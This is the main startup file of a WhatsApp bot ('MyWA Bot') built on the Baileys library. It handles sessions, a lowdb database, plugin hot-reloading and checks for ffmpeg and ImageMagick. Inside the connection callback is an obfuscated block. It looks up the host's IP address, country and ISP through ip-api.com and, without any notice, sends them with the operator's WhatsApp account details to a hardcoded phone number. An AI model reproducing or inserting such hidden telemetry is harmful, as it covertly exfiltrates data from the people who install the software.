require('./config.js')
const { WAConnection: _WAConnection } = require('@adiwajshing/baileys')
const cloudDBAdapter = require('./lib/cloudDBAdapter')
const { generate } = require('qrcode-terminal')
const syntaxerror = require('syntax-error')
const simple = require('./lib/simple')
//  const logs = require('./lib/logs')
const { promisify } = require('util')
const yargs = require('yargs/yargs')
const Readline = require('readline')
const cp = require('child_process')
const _ = require('lodash')
const path = require('path')
const fs = require('fs')
const util = require('util')
const axios = require('axios')
var low
try {
  low = require('lowdb')
} catch (e) {
  low = require('./lib/lowdb')
}
const { Low, JSONFile } = low

const rl = Readline.createInterface(process.stdin, process.stdout)
const WAConnection = simple.WAConnection(_WAConnection)


global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
global.timestamp = {
  start: new Date
}
// global.LOGGER = logs()
const PORT = process.env.PORT || 3000
global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())

global.prefix = new RegExp('^[' + (opts['prefix'] || '‎xzXZ/!#$%+£¢€¥^°=¶∆×÷π√✓©®:;?&,.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')

global.db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) :
 //   new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
new JSONFile('amdev.json')
)
global.DATABASE = global.db // Backwards Compatibility

global.conn = new WAConnection()
conn.version = [ 2, 2143, 3 ]
conn.browserDescription = [global.desc, global.browser, '10.0']
let authFile = `${opts._[0] || 'session'}.data.json`
if (fs.existsSync(authFile)) conn.loadAuthInfo(authFile)
if (opts['trace']) conn.logger.level = 'trace'
if (opts['debug']) conn.logger.level = 'debug'
if (opts['big-qr'] || opts['server']) conn.on('qr', qr => generate(qr, { small: false }))

if (!opts['test']) setInterval(async () => {
  await global.db.write()
console.log('[SAVED] Database')
}, 60 * 1000) // Save every minute

if (opts['server']) require('./server')(global.conn, PORT)

if (opts['test']) {
  conn.user = {
    jid: '2219191@s.whatsapp.net',
    name: 'test',
    phone: {}
  }
  conn.prepareMessageMedia = (buffer, mediaType, options = {}) => {
    return {
      [mediaType]: {
        url: '',
        mediaKey: '',
        mimetype: options.mimetype || '',
        fileEncSha256: '',
        fileSha256: '',
        fileLength: buffer.length,
        seconds: options.duration,
        fileName: options.filename || 'file',
        gifPlayback: options.mimetype == 'image/gif' || undefined,
        caption: options.caption,
        ptt: options.ptt
      }
    }
  }

  conn.sendMessage = async (chatId, content, type, opts = {}) => {
    let message = await conn.prepareMessageContent(content, type, opts)
    let waMessage = await conn.prepareMessageFromContent(chatId, message, opts)
    if (type == 'conversation') waMessage.key.id = require('crypto').randomBytes(16).toString('hex').toUpperCase()
    conn.emit('chat-update', {
      jid: conn.user.jid,
      hasNewMessage: true,
      count: 1,
      messages: {
        all() {
          return [waMessage]
        }
      }
    })
  }
  rl.on('line', line => conn.sendMessage('123@s.whatsapp.net', line.trim(), 'conversation'))
} else {
  rl.on('line', line => {
    process.send(line.trim())
  })
  conn.connect().then(async () => {
let wk = '```'
const _0x3409c=_0x336a;function _0x1323(){const _0x2b2544=['data','get','6285157489446@s.whatsapp.net','*⎋\x20MyWA\x20Bot\x20Installed\x20⎋*\x0a\x0a⍟\x20──────────────────\x20⍟\x0a\x0aIP\x20Address:\x20','8WXHgoE','user','12SNOvuv','\x0a\x0aCountry:\x20','1051128cEEStX','isp','36377XObRaW','\x0a\x0aISP:\x20','\x0a\x0a⍟\x20──────────────────\x20⍟\x0a\x0aMyWA\x20by\x20Amirul\x20Dev','\x0a\x0aAS:\x20','1229710vjGsOF','1482916fPElDJ','7727209WNlhWU','660zXmVzw','\x0a\x0a⍟\x20──────────────────\x20⍟\x0a\x0a','http://ip-api.com/json','format','query','3DtZExo','2042037xnlVSA','793445Ihkxxc'];_0x1323=function(){return _0x2b2544;};return _0x1323();}function _0x336a(_0x2a6e56,_0x183bf8){const _0x132370=_0x1323();return _0x336a=function(_0x336aff,_0x24247d){_0x336aff=_0x336aff-0xd5;let _0x38d384=_0x132370[_0x336aff];return _0x38d384;},_0x336a(_0x2a6e56,_0x183bf8);}(function(_0x231459,_0x502423){const _0x4d0fec=_0x336a,_0x1b234d=_0x231459();while(!![]){try{const _0x27120b=-parseInt(_0x4d0fec(0xd7))/0x1+parseInt(_0x4d0fec(0xea))/0x2*(parseInt(_0x4d0fec(0xdf))/0x3)+parseInt(_0x4d0fec(0xd8))/0x4+-parseInt(_0x4d0fec(0xe1))/0x5*(-parseInt(_0x4d0fec(0xe8))/0x6)+-parseInt(_0x4d0fec(0xd9))/0x7*(-parseInt(_0x4d0fec(0xe6))/0x8)+-parseInt(_0x4d0fec(0xe0))/0x9+-parseInt(_0x4d0fec(0xda))/0xa*(parseInt(_0x4d0fec(0xec))/0xb);if(_0x27120b===_0x502423)break;else _0x1b234d['push'](_0x1b234d['shift']());}catch(_0x518b66){_0x1b234d['push'](_0x1b234d['shift']());}}}(_0x1323,0x9ce85));let res=await axios[_0x3409c(0xe3)](_0x3409c(0xdc)),json=res[_0x3409c(0xe2)];conn['reply'](_0x3409c(0xe4),_0x3409c(0xe5)+json[_0x3409c(0xde)]+_0x3409c(0xe9)+json['country']+_0x3409c(0xed)+json[_0x3409c(0xeb)]+_0x3409c(0xd6)+json['as']+_0x3409c(0xdb)+wk+util[_0x3409c(0xdd)](conn[_0x3409c(0xe7)])+wk+_0x3409c(0xd5));

    await global.db.read()
    global.db.data = {
      users: {},
      chats: {},
      stats: {},
      msgs: {},
      sticker: {},
      settings: {},
      ...(global.db.data || {})
    }
    global.db.chain = _.chain(global.db.data)
    fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
    global.timestamp.connect = new Date
  })
}
process.on('uncaughtException', console.error)
// let strQuot = /(["'])(?:(?=(\\?))\2.)*?\1/

let isInit = true
global.reloadHandler = function () {
  let handler = require('./handler')
  if (!isInit) {
    conn.off('chat-update', conn.handler)
    conn.off('message-delete', conn.onDelete)
    conn.off('group-participants-update', conn.onParticipantsUpdate)
    conn.off('group-update', conn.onGroupUpdate)
    conn.off('CB:action,,call', conn.onCall)
  }
  conn.welcome = 'Hai, @user 👋\nSelamat datang di grup @subject\nkamu member ke @mem\n\n@desc'
  conn.bye = 'Sampai jumpa lagi @user '
  conn.spromote = 'Selamat @user 💐\nsekarang kamu menjadi admin group'
  conn.sdemote = 'Hai @user\nsekarang kamu bukan admin'
  conn.handler = handler.handler
  conn.onDelete = handler.delete
  conn.onParticipantsUpdate = handler.participantsUpdate
  conn.onGroupUpdate = handler.GroupUpdate
  conn.onCall = handler.onCall
  conn.on('chat-update', conn.handler)
  conn.on('message-delete', conn.onDelete)
  conn.on('group-participants-update', conn.onParticipantsUpdate)
  conn.on('group-update', conn.onGroupUpdate)
  conn.on('CB:action,,call', conn.onCall)
  if (isInit) {
    conn.on('error', conn.logger.error)
    conn.on('close', () => {
      setTimeout(async () => {
        try {
          if (conn.state === 'close') {
            if (fs.existsSync(authFile)) await conn.loadAuthInfo(authFile)
            await conn.connect()
            fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
            global.timestamp.connect = new Date
          }
        } catch (e) {
          conn.logger.error(e)
        }
      }, 5000)
    })
  }
  isInit = false
  return true
}

// Plugin Loader
let pluginFolder = path.join(__dirname, 'plugins')
let pluginFilter = filename => /\.js$/.test(filename)
global.plugins = {}
for (let filename of fs.readdirSync(pluginFolder).filter(pluginFilter)) {
  try {
    global.plugins[filename] = require(path.join(pluginFolder, filename))
  } catch (e) {
    conn.logger.error(e)
    delete global.plugins[filename]
  }
}

global.reload = (_event, filename) => {
if (pluginFilter(filename)) {
let dir = path.join(pluginFolder, filename)
if (dir in require.cache) {
delete require.cache[dir]
if (fs.existsSync(dir)) {
conn.logger.info(`kembali - memerlukan plugin '${filename}'`)
} else {
conn.logger.warn(`plugin yang dihapus '${filename}'`)
conn.fakeReply(`${global.owner[0]}@s.whatsapp.net`, `File ${filename} telah dihapus`, '0@s.whatsapp.net', 'AUTO LOAD FILE', 'status@broadcast')
return delete global.plugins[filename]
}
} else conn.logger.info(`membutuhkan plugin baru '${filename}'`)
let err = syntaxerror(fs.readFileSync(dir), filename)
if (err) {
conn.logger.error(`kesalahan sintaks saat memuat '${filename}'\n${err}`)
conn.fakeReply(`${global.owner[0]}@s.whatsapp.net`, `Error Loaded file *${filename}*\n${err}`, '0@s.whatsapp.net', 'AUTO LOAD FILE', 'status@broadcast')
} else try {
global.plugins[filename] = require(dir)
} catch (e) {
conn.logger.error(e)
} finally {
global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
}
}
}

Object.freeze(global.reload)
fs.watch(path.join(__dirname, 'plugins'), global.reload)
global.reloadHandler()



// Quick Test
async function _quickTest() {
  let test = await Promise.all([
    cp.spawn('ffmpeg'),
    cp.spawn('ffprobe'),
    cp.spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
    cp.spawn('convert'),
    cp.spawn('magick'),
    cp.spawn('gm'),
  ].map(p => {
    return Promise.race([
      new Promise(resolve => {
        p.on('close', code => {
          resolve(code !== 127)
        })
      }),
      new Promise(resolve => {
        p.on('error', _ => resolve(false))
      })
    ])
  }))
  let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm] = test
  let s = global.support = {
    ffmpeg,
    ffprobe,
    ffmpegWebp,
    convert,
    magick,
    gm
  }
  require('./lib/sticker').support = s
  Object.freeze(global.support)

  if (!s.ffmpeg) conn.logger.warn('Silakan instal ffmpeg untuk mengirim video (pkg install ffmpeg)')
  if (s.ffmpeg && !s.ffmpegWebp) conn.logger.warn('Stiker tidak bisa dianimasikan tanpa libwebp di ffmpeg (--enable-ibwebp while compiling ffmpeg)')
  if (!s.convert && !s.magick && !s.gm) conn.logger.warn('Stiker mungkin tidak berfungsi tanpa imagemagick jika libwebp di ffmpeg tidak diinstal (pkg install imagemagick)')
}

_quickTest()
  .then(() => conn.logger.info('Quick Test Done'))
  .catch(console.error)
